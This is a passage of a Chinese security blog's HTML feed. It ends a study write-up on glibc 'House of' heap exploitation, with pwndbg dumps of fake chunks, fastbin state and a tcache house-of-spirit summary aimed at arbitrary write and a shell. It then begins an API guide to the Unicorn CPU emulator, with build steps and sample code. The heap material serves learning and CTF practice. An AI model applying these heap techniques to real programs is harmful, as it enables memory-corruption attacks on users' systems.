x&#x2F;16xg 0x7fffffffdca8</span><br><span class="line">0x7fffffffdca8:0x00000000000000400x00007ffff7ffe168 &lt;&#x3D;&#x3D;&#x3D;&#x3D; fake chunk1</span><br><span class="line">0x7fffffffdcb8:0x0000000000f0b5ff0x0000000000000001</span><br><span class="line">0x7fffffffdcc8:0x00000000004008dd0x00007fffffffdcfe</span><br><span class="line">0x7fffffffdcd8:0x00000000000000000x0000000000400890</span><br><span class="line">0x7fffffffdce8:0x00000000000012340x00007fffffffdde0 &lt;&#x3D;&#x3D;&#x3D;&#x3D; fake chunk2</span><br><span class="line">0x7fffffffdcf8:0xce9b2a14d13598000x0000000000400890</span><br><span class="line">0x7fffffffdd08:0x00007ffff7a2d8300x0000000000000001</span><br><span class="line">0x7fffffffdd18:0x00007fffffffdde80x00000001f7ffcca0</span><br></pre></td></tr></table></figure></div><h4 id="3-free该堆指针"><a href="#3-free该堆指针" class="headerlink" title="3 free该堆指针"></a>3 free该堆指针</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x7fffffffdca0 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure></div><h4 id="4-malloc申请到该区域"><a href="#4-malloc申请到该区域" class="headerlink" title="4 malloc申请到该区域"></a>4 malloc申请到该区域</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/30/Eed46cZAODJnChf.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/30/Eed46cZAODJnChf.png" class="lazyload"></a></p><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>glibc2.26之后加入了tcache机制,tcache在提高内存管理效率的同时，安全性有所下降</p><p>tcache house of spirit只需伪造一个size区域，然后将伪造的fakechunk释放，再次malloc相应大小就可以得到fake_chunk。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>house_of_spirit可以进行任意地址写，可以改写为system直接getshell，也可以进一步利用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>House of系列堆漏洞的分析到这里就结束了，通过gdb单步调试，对堆结构等熟悉了很多。</p><p>在glibc版本不断升级的同时，堆内的一些保护不断完善，但与此同时，像tcache这样的新增技术也暴露出新的漏洞，在后期的漏洞挖掘中，对这些新技术的漏洞挖掘应该更加重视。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;House-of-系列堆漏洞详解-二&quot;&gt;&lt;a href=&quot;#House-of-系列堆漏洞详解-二&quot; class=&quot;headerlink&quot; title=&quot;House of 系列堆漏洞详解(二)&quot;&gt;&lt;/a&gt;House of</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(一)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E4%B8%80)/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-03-16T04:51:08.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-一"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-一" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(一)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(一)</h1><p>之前对Capstone反汇编引擎的API分析文档(<a href="https://xz.aliyun.com/t/5753)已经被[官方](http://www.capstone-engine.org/documentation.html)收录" target="_blank" rel="noopener">https://xz.aliyun.com/t/5753)已经被[官方](http://www.capstone-engine.org/documentation.html)收录</a> <a href="https://github.com/kabeor/Micro-Capstone-Engine-API-Documentation" target="_blank" rel="noopener">https://github.com/kabeor/Micro-Capstone-Engine-API-Documentation</a>  ，在实现自己想要做出的调试器的路上，又遇到了与Capstone同作者的国外大佬aquynh的另一个著名项目Unicorn，不巧的是，详尽的API文档仍然较少，更多的是大篇幅的代码，因此决定继续分析Unicorn框架，包括数据类型，已开放API及其实现。</p><p>Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等，该项目被用于Radare2逆向分析框架，GEF(gdb的pwn分析插件)，Pwndbg，Angr符号执行框架等多个著名项目。接下来我也将通过阅读源码和代码实际调用来写一个简单的非官方版本的API手册。</p><p>个人博客： kabeor.cn</p><h2 id="0x0-开发准备"><a href="#0x0-开发准备" class="headerlink" title="0x0 开发准备"></a>0x0 开发准备</h2><p>Unicorn官网:     <a href="http://www.unicorn-engine.org" target="_blank" rel="noopener">http://www.unicorn-engine.org</a></p><h3 id="自行编译lib和dll方法"><a href="#自行编译lib和dll方法" class="headerlink" title="自行编译lib和dll方法"></a>自行编译lib和dll方法</h3><p>源码： <a href="https://github.com/unicorn-engine/unicorn/archive/master.zip" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/archive/master.zip</a></p><p>下载后解压</p><p>文件结构如下：</p><blockquote><p>. &lt;- 主要引擎core engine + README + 编译文档COMPILE.TXT 等<br>├── arch &lt;- 各语言反编译支持的代码实现<br>├── bindings &lt;- 中间件<br>│ ├── dotnet &lt;- .Net 中间件 + 测试代码<br>│ ├── go &lt;- go 中间件 + 测试代码<br>│ ├── haskell &lt;- Haskell 中间件 + 测试代码<br>│ ├── java &lt;- Java 中间件 + 测试代码<br>│ ├── pascal &lt;- Pascal 中间件 + 测试代码<br>│ ├── python &lt;- Python 中间件 + 测试代码<br>│ ├── ruby &lt;- Ruby 中间件 + 测试代码<br>│ └── vb6 &lt;- VB6 中间件 + 测试代码<br>├── docs &lt;- 文档，主要是Unicorn的实现思路<br>├── include &lt;- C头文件<br>├── msvc &lt;- Microsoft Visual Studio 支持（Windows）<br>├── qemu &lt;- qemu框架源码<br>├── samples &lt;- Unicorn使用示例<br>└── tests &lt;- C语言测试用例</p></blockquote><p>下面演示Windows10使用Visual Studio2019编译</p><p>打开msvc文件夹，内部结构如下</p><p><a href="https://i.loli.net/2020/01/17/iyodlNFY7hHEOgS.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/iyodlNFY7hHEOgS.png" class="lazyload"></a></p><p>VS打开unicorn.sln项目文件，解决方案自动载入这些</p><p><a href="https://i.loli.net/2020/01/17/fOnNpSKvjYyc7QB.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/fOnNpSKvjYyc7QB.png" class="lazyload"></a></p><p>如果都需要的话，直接编译就好了，只需要其中几种，则右键解决方案-&gt;属性-&gt;配置属性 如下</p><p><a href="https://i.loli.net/2020/01/17/F3rSByYuNTGDtC1.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/F3rSByYuNTGDtC1.png" class="lazyload"></a></p><p>生成选项中勾选你需要的支持项即可</p><p>项目编译属性为：</p><ol><li>使用多字节字符集</li><li>不使用预编译头</li><li>附加选项 /wd4018 /wd4244 /wd4267</li><li>预处理器定义中添加   <code>_CRT_SECURE_NO_WARNINGS</code></li></ol><p>编译后会在当前文件夹Debug目录下生成unicorn.lib静态编译库和unicorn.dll动态库这样就可以开始使用Unicorn进行开发了</p><p>编译到最后一项可能会报错系统找不到指定的路径，查看makefile发现问题出现在此处<br><a href="https://i.loli.net/2020/01/17/YCMNcEVyX8GHoPb.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/YCMNcEVyX8GHoPb.png" class="lazyload"></a></p><p>事实上只不过是不能将生成的lib和dll复制到新建的文件夹而已，只需要到生成目录去找即可。</p><p>官方目前提供的最新已编译版本为1.0.1版本，比较老，建议自己编辑最新版本源码，以获得更多可用API。<br>Win32：<a href="https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win32.zip" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win32.zip</a><br>Win64：<a href="https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win64.zip" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/releases/download/1.0.1/unicorn-1.0.1-win64.zip</a></p><p><strong>注意： 选x32或x64将影响后面开发的位数</strong></p><h3 id="引擎调用测试"><a href="#引擎调用测试" class="headerlink" title="引擎调用测试"></a>引擎调用测试</h3><p>新建一个VS项目，将..\unicorn-master\include\unicorn中的头文件以及编译好的lib和dll文件全部拷贝到新建项目的主目录下</p><p><a href="https://i.loli.net/2020/01/17/I25E9sWcJpGyax7.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/I25E9sWcJpGyax7.png" class="lazyload"></a></p><p>在VS解决方案中，头文件添加现有项unicorn.h，资源文件中添加unicorn.lib，重新生成解决方案</p><p><a href="https://i.loli.net/2020/01/17/OVaHwelNQ4tcLmo.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/OVaHwelNQ4tcLmo.png" class="lazyload"></a></p><p>接下来测试我们生成的unicorn框架</p><p>主文件代码如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要模拟的指令</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x41\x4a"</span> <span class="comment">// INC ecx; DEC edx</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 起始地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    <span class="keyword">int</span> r_ecx = <span class="number">0x1234</span>;     <span class="comment">// ECX 寄存器</span></span><br><span class="line">    <span class="keyword">int</span> r_edx = <span class="number">0x7890</span>;     <span class="comment">// EDX 寄存器</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Emulate i386 code\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// X86-32bit 模式初始化模拟</span></span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给模拟器申请 2MB 内存</span></span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将要模拟的指令写入内存</span></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化寄存器</span></span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_ECX, &amp;r_ecx);</span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_EDX, &amp;r_edx);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; ECX = 0x%x\n"</span>, r_ecx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EDX = 0x%x\n"</span>, r_edx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 模拟代码</span></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">        err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印寄存器值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Emulation done. Below is the CPU context\n"</span>);</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_ECX, &amp;r_ecx);</span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EDX, &amp;r_edx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; ECX = 0x%x\n"</span>, r_ecx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; EDX = 0x%x\n"</span>, r_edx);</span><br><span class="line"></span><br><span class="line">    uc_close(uc);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>运行结果如下</p><p><a href="https://i.loli.net/2020/01/17/bpu4r8hgzUvO7Pm.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/17/bpu4r8hgzUvO7Pm.png" class="lazyload"></a></p><p>ecx+1和edx-1成功模拟。</p><h2 id="0x1-数据类型分析"><a href="#0x1-数据类型分析" class="headerlink" title="0x1 数据类型分析"></a>0x1 数据类型分析</h2><h3 id="uc-arch"><a href="#uc-arch" class="headerlink" title="uc_arch"></a>uc_arch</h3><p>架构选择</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_arch &#123;</span><br><span class="line">    UC_ARCH_ARM = <span class="number">1</span>,    <span class="comment">// ARM 架构 (包括 Thumb, Thumb-2)</span></span><br><span class="line">    UC_ARCH_ARM64,      <span class="comment">// ARM-64, 也称 AArch64</span></span><br><span class="line">    UC_ARCH_MIPS,       <span class="comment">// Mips 架构</span></span><br><span class="line">    UC_ARCH_X86,        <span class="comment">// X86 架构 (包括 x86 &amp; x86-64)</span></span><br><span class="line">    UC_ARCH_PPC,        <span class="comment">// PowerPC 架构 (暂不支持)</span></span><br><span class="line">    UC_ARCH_SPARC,      <span class="comment">// Sparc 架构</span></span><br><span class="line">    UC_ARCH_M68K,       <span class="comment">// M68K 架构</span></span><br><span class="line">    UC_ARCH_MAX,</span><br><span class="line">&#125; uc_arch;</span><br></pre></td></tr></table></figure></div><h3 id="uc-mode"><a href="#uc-mode" class="headerlink" title="uc_mode"></a>uc_mode</h3><p>模式选择</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_mode &#123;</span><br><span class="line">    UC_MODE_LITTLE_ENDIAN = <span class="number">0</span>,    <span class="comment">// 小端序模式 (默认)</span></span><br><span class="line">    UC_MODE_BIG_ENDIAN = <span class="number">1</span> &lt;&lt; <span class="number">30</span>, <span class="comment">// 大端序模式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// arm / arm64</span></span><br><span class="line">    UC_MODE_ARM = <span class="number">0</span>,              <span class="comment">// ARM 模式</span></span><br><span class="line">    UC_MODE_THUMB = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,       <span class="comment">// THUMB 模式 (包括 Thumb-2)</span></span><br><span class="line">    UC_MODE_MCLASS = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,      <span class="comment">// ARM's Cortex-M 系列 (暂不支持)</span></span><br><span class="line">    UC_MODE_V8 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,          <span class="comment">// ARMv8 A32 encodings for ARM (暂不支持)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// arm (32bit) cpu 类型</span></span><br><span class="line">    UC_MODE_ARM926 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>,  <span class="comment">// ARM926 CPU 类型</span></span><br><span class="line">    UC_MODE_ARM946 = <span class="number">1</span> &lt;&lt; <span class="number">8</span>,  <span class="comment">// ARM946 CPU 类型</span></span><br><span class="line">    UC_MODE_ARM1176 = <span class="number">1</span> &lt;&lt; <span class="number">9</span>,  <span class="comment">// ARM1176 CPU 类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// mips</span></span><br><span class="line">    UC_MODE_MICRO = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,       <span class="comment">// MicroMips 模式 (暂不支持)</span></span><br><span class="line">    UC_MODE_MIPS3 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,       <span class="comment">// Mips III ISA (暂不支持)</span></span><br><span class="line">    UC_MODE_MIPS32R6 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,    <span class="comment">// Mips32r6 ISA (暂不支持)</span></span><br><span class="line">    UC_MODE_MIPS32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,      <span class="comment">// Mips32 ISA</span></span><br><span class="line">    UC_MODE_MIPS64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,      <span class="comment">// Mips64 ISA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x86 / x64</span></span><br><span class="line">    UC_MODE_16 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,          <span class="comment">// 16-bit 模式</span></span><br><span class="line">    UC_MODE_32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,          <span class="comment">// 32-bit 模式</span></span><br><span class="line">    UC_MODE_64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,          <span class="comment">// 64-bit 模式</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ppc </span></span><br><span class="line">    UC_MODE_PPC32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,       <span class="comment">// 32-bit 模式 (暂不支持)</span></span><br><span class="line">    UC_MODE_PPC64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,       <span class="comment">// 64-bit 模式 (暂不支持)</span></span><br><span class="line">    UC_MODE_QPX = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,         <span class="comment">// Quad Processing eXtensions 模式 (暂不支持)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sparc</span></span><br><span class="line">    UC_MODE_SPARC32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,     <span class="comment">// 32-bit 模式</span></span><br><span class="line">    UC_MODE_SPARC64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,     <span class="comment">// 64-bit 模式</span></span><br><span class="line">    UC_MODE_V9 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,          <span class="comment">// SparcV9 模式 (暂不支持)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// m68k</span></span><br><span class="line">&#125; uc_mode;</span><br></pre></td></tr></table></figure></div><h3 id="uc-err"><a href="#uc-err" class="headerlink" title="uc_err"></a>uc_err</h3><p>错误类型，是uc_errno()的返回值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_err &#123;</span><br><span class="line">    UC_ERR_OK = <span class="number">0</span>,   <span class="comment">// 无错误</span></span><br><span class="line">    UC_ERR_NOMEM,      <span class="comment">// 内存不足: uc_open(), uc_emulate()</span></span><br><span class="line">    UC_ERR_ARCH,     <span class="comment">// 不支持的架构: uc_open()</span></span><br><span class="line">    UC_ERR_HANDLE,   <span class="comment">// 不可用句柄</span></span><br><span class="line">    UC_ERR_MODE,     <span class="comment">// 不可用/不支持架构: uc_open()</span></span><br><span class="line">    UC_ERR_VERSION,  <span class="comment">// 不支持版本 (中间件)</span></span><br><span class="line">    UC_ERR_READ_UNMAPPED, <span class="comment">// 由于在未映射的内存上读取而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_WRITE_UNMAPPED, <span class="comment">// 由于在未映射的内存上写入而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_FETCH_UNMAPPED, <span class="comment">// 由于在未映射的内存中获取数据而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_HOOK,    <span class="comment">// 无效的hook类型: uc_hook_add()</span></span><br><span class="line">    UC_ERR_INSN_INVALID, <span class="comment">// 由于指令无效而退出模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_MAP, <span class="comment">// 无效的内存映射: uc_mem_map()</span></span><br><span class="line">    UC_ERR_WRITE_PROT, <span class="comment">// 由于UC_MEM_WRITE_PROT冲突而停止模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_READ_PROT, <span class="comment">// 由于UC_MEM_READ_PROT冲突而停止模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_FETCH_PROT, <span class="comment">// 由于UC_MEM_FETCH_PROT冲突而停止模拟: uc_emu_start()</span></span><br><span class="line">    UC_ERR_ARG,     <span class="comment">// 提供给uc_xxx函数的无效参数</span></span><br><span class="line">    UC_ERR_READ_UNALIGNED,  <span class="comment">// 未对齐读取</span></span><br><span class="line">    UC_ERR_WRITE_UNALIGNED,  <span class="comment">// 未对齐写入</span></span><br><span class="line">    UC_ERR_FETCH_UNALIGNED,  <span class="comment">// 未对齐的提取</span></span><br><span class="line">    UC_ERR_HOOK_EXIST,  <span class="comment">// 此事件的钩子已经存在</span></span><br><span class="line">    UC_ERR_RESOURCE,    <span class="comment">// 资源不足: uc_emu_start()</span></span><br><span class="line">    UC_ERR_EXCEPTION, <span class="comment">// 未处理的CPU异常</span></span><br><span class="line">    UC_ERR_TIMEOUT <span class="comment">// 模拟超时</span></span><br><span class="line">&#125; uc_err;</span><br></pre></td></tr></table></figure></div><h3 id="uc-mem-type"><a href="#uc-mem-type" class="headerlink" title="uc_mem_type"></a>uc_mem_type</h3><p>UC_HOOK_MEM_*的所有内存访问类型</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_mem_type &#123;</span><br><span class="line">    UC_MEM_READ = <span class="number">16</span>,   <span class="comment">// 内存从..读取</span></span><br><span class="line">    UC_MEM_WRITE,       <span class="comment">// 内存写入到..</span></span><br><span class="line">    UC_MEM_FETCH,       <span class="comment">// 内存被获取</span></span><br><span class="line">    UC_MEM_READ_UNMAPPED,    <span class="comment">// 未映射内存从..读取</span></span><br><span class="line">    UC_MEM_WRITE_UNMAPPED,   <span class="comment">// 未映射内存写入到..</span></span><br><span class="line">    UC_MEM_FETCH_UNMAPPED,   <span class="comment">// 未映射内存被获取</span></span><br><span class="line">    UC_MEM_WRITE_PROT,  <span class="comment">// 内存写保护，但是已映射</span></span><br><span class="line">    UC_MEM_READ_PROT,   <span class="comment">// 内存读保护，但是已映射</span></span><br><span class="line">    UC_MEM_FETCH_PROT,  <span class="comment">// 内存不可执行，但是已映射</span></span><br><span class="line">    UC_MEM_READ_AFTER,   <span class="comment">// 内存从 (成功访问的地址) 读入</span></span><br><span class="line">&#125; uc_mem_type;</span><br></pre></td></tr></table></figure></div><h3 id="uc-hook-type"><a href="#uc-hook-type" class="headerlink" title="uc_hook_type"></a>uc_hook_type</h3><p>uc_hook_add()的所有hook类型参数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> uc_hook_type &#123;</span><br><span class="line">    <span class="comment">// Hook 所有中断/syscall 事件</span></span><br><span class="line">    UC_HOOK_INTR = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,</span><br><span class="line">    <span class="comment">// Hook 一条特定的指令 - 只支持非常小的指令子集</span></span><br><span class="line">    UC_HOOK_INSN = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,</span><br><span class="line">    <span class="comment">// Hook 一段代码</span></span><br><span class="line">    UC_HOOK_CODE = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,</span><br><span class="line">    <span class="comment">// Hook 基本块</span></span><br><span class="line">    UC_HOOK_BLOCK = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">    <span class="comment">// 用于在未映射的内存上读取内存的Hook</span></span><br><span class="line">    UC_HOOK_MEM_READ_UNMAPPED = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,</span><br><span class="line">    <span class="comment">// Hook 无效的内存写事件</span></span><br><span class="line">    UC_HOOK_MEM_WRITE_UNMAPPED = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">    <span class="comment">// Hook 执行事件的无效内存</span></span><br><span class="line">    UC_HOOK_MEM_FETCH_UNMAPPED = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,</span><br><span class="line">    <span class="comment">// Hook 读保护的内存</span></span><br><span class="line">    UC_HOOK_MEM_READ_PROT = <span class="number">1</span> &lt;&lt; <span class="number">7</span>,</span><br><span class="line">    <span class="comment">// Hook 写保护的内存</span></span><br><span class="line">    UC_HOOK_MEM_WRITE_PROT = <span class="number">1</span> &lt;&lt; <span class="number">8</span>,</span><br><span class="line">    <span class="comment">// Hook 不可执行内存上的内存</span></span><br><span class="line">    UC_HOOK_MEM_FETCH_PROT = <span class="number">1</span> &lt;&lt; <span class="number">9</span>,</span><br><span class="line">    <span class="comment">// Hook 内存读取事件</span></span><br><span class="line">    UC_HOOK_MEM_READ = <span class="number">1</span> &lt;&lt; <span class="number">10</span>,</span><br><span class="line">    <span class="comment">// Hook 内存写入事件</span></span><br><span class="line">    UC_HOOK_MEM_WRITE = <span class="number">1</span> &lt;&lt; <span class="number">11</span>,</span><br><span class="line">    <span class="comment">// Hook 内存获取执行事件</span></span><br><span class="line">    UC_HOOK_MEM_FETCH = <span class="number">1</span> &lt;&lt; <span class="number">12</span>,</span><br><span class="line">    <span class="comment">// Hook 内存读取事件，只允许能成功访问的地址</span></span><br><span class="line">    <span class="comment">// 成功读取后将触发回调</span></span><br><span class="line">    UC_HOOK_MEM_READ_AFTER = <span class="number">1</span> &lt;&lt; <span class="number">13</span>,</span><br><span class="line">    <span class="comment">// Hook 无效指令异常</span></span><br><span class="line">    UC_HOOK_INSN_INVALID = <span 